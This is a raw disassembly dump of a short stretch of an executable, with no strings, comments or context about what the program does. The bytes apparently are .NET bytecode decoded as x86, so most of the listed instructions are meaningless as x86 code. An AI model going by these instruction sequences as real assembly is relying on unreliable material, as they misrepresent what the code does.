  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 ee             	or     -0x12(%edx),%dh
  403d47:	20 00                	and    %al,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 f4                	jb     0x403db5
  403dc1:	20 00                	and    %al,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 54                	jb     0x403e26
  403dd2:	25 00 70 28 25       	and    $0x25287000,%eax
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	0a 3a                	or     (%edx),%bh
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 5e                	jb     0x403e40
  403de2:	25 00 70 28 25       	and    $0x25287000,%eax
  403de7:	00 00                	add    %al,(%eax)
  403de9:	0a 3a                	or     (%edx),%bh
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 6c                	jb     0x403e5e
  403df2:	25 00 70 28 25       	and    $0x25287000,%eax
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 3a                	or     (%edx),%bh
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 f4 20 00       	and    $0x20f472,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 54                	jb     0x403e70
  403e1c:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e21:	00 00                	add    %al,(%eax)
  403e23:	06                   	push   %es
  403e24:	25 72 0c 21 00       	and    $0x210c72,%eax
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 82                	jb     0x403dd5
  403e53:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	06                   	push   %es
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 f4 20 00       	and    $0x20f472,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 8a                	jb     0x403e11
  403e87:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e8c:	00 00                	add    %al,(%eax)
  403e8e:	06                   	push   %es
  403e8f:	25 72 a0 25 00       	and    $0x25a072,%eax
  403e94:	70 6f                	jo     0x403f05
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 82                	jb     0x403e1f
  403e9d:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea2:	00 00                	add    %al,(%eax)
  403ea4:	06                   	push   %es
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 ae                	jb     0x403e89
  403edb:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ee0:	00 00                	add    %al,(%eax)
  403ee2:	06                   	push   %es
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 82                	jb     0x403e6d
  403eeb:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	06                   	push   %es
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 82             	or     %esi,-0x7e(%edx)
  403f1e:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f23:	00 00                	add    %al,(%eax)
  403f25:	06                   	push   %es
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 ae                	jb     0x403edc
  403f2e:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f33:	00 00                	add    %al,(%eax)
  403f35:	06                   	push   %es
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 82                	jb     0x403f6a
  403fe8:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403fed:	00 00                	add    %al,(%eax)
  403fef:	06                   	push   %es
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 b8             	or     -0x48(%edx),%dh
  404006:	25 00 70 6f c1       	and    $0xc16f7000,%eax
  40400b:	00 00                	add    %al,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 d4             	add    %dh,-0x2c(%edx)
  404025:	25 00 70 14 d0       	and    $0xd0147000,%eax
  40402a:	0f 00 00             	sldt   (%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 dc                	jb     0x4040a1
  4040c5:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	06                   	push   %es
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 0a                	jb     0x40411d
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 52             	add    %dh,0x52(%edx)
  404180:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
